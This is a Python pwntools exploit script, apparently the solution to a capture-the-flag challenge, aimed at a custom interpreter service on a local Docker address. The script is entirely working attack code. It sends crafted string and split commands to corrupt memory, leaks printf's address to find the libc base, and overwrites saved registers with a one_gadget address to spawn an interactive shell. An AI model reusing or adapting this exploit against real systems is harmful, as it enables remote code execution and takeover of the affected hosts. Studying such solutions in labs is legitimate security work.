from pwn import *
from ast import literal_eval
from re import search

HOST = "172.17.0.2"
PORT = 9000
COMMANDS = [
    b"a = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN\"",
    b"a.split(M)",
    b"a0 = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN\"",
    b"a0.split(M)",
    b"a00 = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN\"",
    b"a00.split(a)",
]
LIBC_PATH = "../attachments/libc-2.31.so"
ONE_GADGET_OFFSET = 0xe3b04

context.os = 'linux'
context.arch = 'amd64'

def sendline(r, what: bytes):
    r.sendline(what)
    return r.recvuntil(b">>> ")

r = remote(HOST, PORT)
r.recvuntil(b">>> ")
for c in COMMANDS:
    sendline(r, c)

content = sendline(r, b"var_dump")
row = content.splitlines()[1]
s = re.search(rb"a0 = '(.+)'", row)
printf_leak = literal_eval(f"b'{s.group(1).decode()}'")[25:]

l = ELF(LIBC_PATH)
l.address = int.from_bytes(printf_leak, 'little') - l.sym["printf"]
sh_addr = l.address + ONE_GADGET_OFFSET
sendline(r, b"a000 = \"abcdefghijklmnRBP4RBP8" + p64(sh_addr) + b"\"")

r.sendline(b"quit")
r.interactive()
